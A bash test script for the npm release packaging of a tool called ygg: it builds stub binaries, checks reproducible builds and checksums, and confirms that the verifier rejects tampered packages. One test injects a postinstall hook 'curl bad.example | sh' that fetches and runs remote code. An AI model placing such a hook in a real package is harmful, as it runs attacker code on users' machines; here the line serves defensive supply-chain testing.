#!/usr/bin/env bash
set -euo pipefail

usage() {
    printf 'usage: %s [VERSION]\n' "$0" >&2
}
if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
    usage
    exit 0
fi
if [[ $# -gt 1 ]]; then
    usage
    exit 2
fi

repository_directory=$(CDPATH= cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd -P)
version=${1:-$(awk -F '"' '/^version = / { print $2; exit }' "$repository_directory/Cargo.toml")}
version=${version#v}
script_directory="$repository_directory/scripts"
for command in bash python3 npm; do
    command -v "$command" >/dev/null 2>&1 || {
        printf 'required npm test command is unavailable: %s\n' "$command" >&2
        exit 1
    }
done

work_directory=$(mktemp -d "${TMPDIR:-/tmp}/ygg-npm-test.XXXXXX")
trap 'rm -rf "$work_directory"' EXIT
native_directory="$work_directory/native"
output_directory="$work_directory/npm"
repeat_directory="$work_directory/npm-repeat"
mkdir -p "$native_directory"

python3 - "$native_directory" "$version" <<'PY'
import gzip
import hashlib
import pathlib
import stat
import sys
import tarfile

native = pathlib.Path(sys.argv[1])
version = sys.argv[2]
targets = (
    "aarch64-apple-darwin",
    "x86_64-apple-darwin",
    "x86_64-unknown-linux-gnu",
)


def add_directory(archive, name):
    info = tarfile.TarInfo(name)
    info.type = tarfile.DIRTYPE
    info.mode = 0o755
    info.uid = info.gid = 0
    info.mtime = 0
    archive.addfile(info)


def add_file(archive, name, data, executable=False):
    info = tarfile.TarInfo(name)
    info.mode = 0o755 if executable else 0o644
    info.uid = info.gid = 0
    info.mtime = 0
    info.size = len(data)
    archive.addfile(info, __import__("io").BytesIO(data))

for target in targets:
    root = f"ygg-{version}-{target}"
    archive_path = native / f"{root}.tar.gz"
    ygg = f'''#!/bin/sh
set -eu
case "${{1-}}" in
  --version) printf '%s\\n' 'ygg {version}' ;;
  --help) printf '%s\\n' 'fake ygg help' ;;
  --probe) printf 'cwd=%s\\narg=%s\\nenv=%s\\n' "$(pwd -P)" "${{2-}}" "${{YGG_NPM_TEST_ENV-}}" ;;
  --exit) exit "${{2:-23}}" ;;
  *) printf 'fake ygg\\n' ;;
esac
'''.encode()
    host = f'''#!/bin/sh
set -eu
printf '%s\\n' '{{"protocol_version":1,"request_id":"npm-test","seq":1,"type":"hello","data":{{"sdk_version":"{version}"}}}}'
'''.encode()
    with archive_path.open("wb") as raw:
        with gzip.GzipFile(filename="", mode="wb", fileobj=raw, compresslevel=9, mtime=0) as compressed:
            with tarfile.open(fileobj=compressed, mode="w", format=tarfile.GNU_FORMAT) as archive:
                add_directory(archive, root)
                add_file(archive, f"{root}/ygg", ygg, executable=True)
                add_file(archive, f"{root}/ygg-host", host, executable=True)
                add_file(archive, f"{root}/LICENSE", b"MIT License\\n")
                add_file(archive, f"{root}/README.md", b"# Ygg fixture\\n")
                for directory in ("docs", "examples", "sdk"):
                    add_directory(archive, f"{root}/{directory}")
                add_file(archive, f"{root}/docs/index.md", b"# Docs\\n")
                add_file(archive, f"{root}/examples/example.md", b"# Example\\n")
                add_file(archive, f"{root}/sdk/python.py", b"# SDK fixture\\n")

lines = []
install = native / "install-ygg.sh"
install.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
install.chmod(0o755)
for path in sorted(native.iterdir()):
    if path.name == "install-ygg.sh" or path.suffix == ".gz":
        lines.append(f"{hashlib.sha256(path.read_bytes()).hexdigest()}  ./{path.name}")
(native / "YGG_SHA256SUMS").write_text("\n".join(lines) + "\n", encoding="ascii")
PY

SOURCE_DATE_EPOCH=0 "$script_directory/package-ygg-npm.sh" \
    "$version" \
    "$native_directory" \
    "$output_directory" \
    "$native_directory/YGG_SHA256SUMS"
python3 "$script_directory/generate-ygg-release-metadata.py" \
    "$version" \
    "v$version" \
    "0123456789abcdef0123456789abcdef01234567" \
    "abcdef0123456789abcdef0123456789abcdef01" \
    "skaft-software/ygg/.github/workflows/release-ygg.yml@refs/tags/ygg-binaries-v$version" \
    "skaft-software/ygg" \
    "$native_directory/YGG_SHA256SUMS" \
    "$native_directory/YGG_RELEASE_METADATA.json" >/dev/null
python3 "$script_directory/create-ygg-npm-manifest.py" \
    "$version" \
    "v$version" \
    "0123456789abcdef0123456789abcdef01234567" \
    "abcdef0123456789abcdef0123456789abcdef01" \
    "$native_directory/YGG_RELEASE_METADATA.json" \
    "$output_directory" \
    "$output_directory/YGG_NPM_MANIFEST.json" \
    "$output_directory/YGG_NPM_SHA256SUMS" >/dev/null
python3 "$script_directory/verify-ygg-npm.py" "$version" "$output_directory" --json > "$work_directory/verification.json"

# Repacking the same immutable inputs with the same epoch must be byte-for-byte
# identical, not merely semantically equivalent.
SOURCE_DATE_EPOCH=0 "$script_directory/package-ygg-npm.sh" \
    "$version" \
    "$native_directory" \
    "$repeat_directory" \
    "$native_directory/YGG_SHA256SUMS" >/dev/null
for artifact in "$output_directory"/*.tgz; do
    name=${artifact##*/}
    cmp "$artifact" "$repeat_directory/$name"
done

# A lifecycle hook is rejected even if it is the only changed package field.
cp "$output_directory/ygg-$version.tgz" "$work_directory/launcher-original.tgz"
python3 - "$output_directory/ygg-$version.tgz" <<'PY'
import io
import json
import pathlib
import sys
import tarfile

path = pathlib.Path(sys.argv[1])
with tarfile.open(path, "r:gz") as source:
    members = source.getmembers()
    payload = {}
    for member in members:
        if member.isreg():
            stream = source.extractfile(member)
            assert stream is not None
            payload[member.name] = stream.read()
with tarfile.open(path, "w:gz") as destination:
    for member in members:
        if member.name == "package/package.json":
            manifest = json.loads(payload[member.name].decode("utf-8"))
            manifest["scripts"] = {"postinstall": "curl bad.example | sh"}
            data = json.dumps(manifest, sort_keys=True).encode("utf-8")
            member = tarfile.TarInfo(member.name)
            member.mode = 0o644
            member.size = len(data)
            member.mtime = 0
            destination.addfile(member, io.BytesIO(data))
        elif member.isreg():
            destination.addfile(member, io.BytesIO(payload[member.name]))
        else:
            destination.addfile(member)
PY
if python3 "$script_directory/verify-ygg-npm.py" "$version" "$output_directory" >/dev/null 2>&1; then
    printf 'verifier accepted a lifecycle hook\n' >&2
    exit 1
fi
mv "$work_directory/launcher-original.tgz" "$output_directory/ygg-$version.tgz"

# Missing checksum metadata is a hard failure; packagers may not silently fall
# back to a checkout or mutable download.
if "$script_directory/package-ygg-npm.sh" "$version" "$native_directory" "$work_directory/missing-output" "$work_directory/no-such-sums" >/dev/null 2>&1; then
    printf 'packager accepted missing immutable checksum metadata\n' >&2
    exit 1
fi

"$script_directory/test-ygg-npm-install.sh" "$output_directory" "$version"
printf 'npm package and launcher tests passed for %s\n' "$version"
